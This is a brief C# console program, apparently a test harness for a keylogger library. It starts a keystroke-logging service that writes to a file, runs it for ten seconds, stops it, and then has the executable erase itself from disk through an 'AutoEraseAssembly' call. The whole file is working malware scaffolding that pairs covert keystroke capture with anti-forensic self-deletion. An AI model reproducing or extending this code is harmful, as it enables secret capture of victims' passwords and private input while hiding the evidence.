using Custom.dotNet.EraseItself;
using KeyLogger.Library;
using KeyLogger.Library.Appenders;
using System.Threading;

namespace KeyLoggerLibrary.ConsoleTest
{
    public class Program
    {

        static void Main(string[] args)
        {
            IKeyLoggerService _service = new KeyLoggerService();

            _service.SetOutputMode = FileAppender.Instance;
            _service.Start();

            //Sleeping 10 seconds
            Thread.Sleep(10000);

            _service.Stop();

            _service = null;

            AutoEraseAssembly.ByCommandLine(System.Reflection.Assembly.GetExecutingAssembly().Location);
        }
    }
}
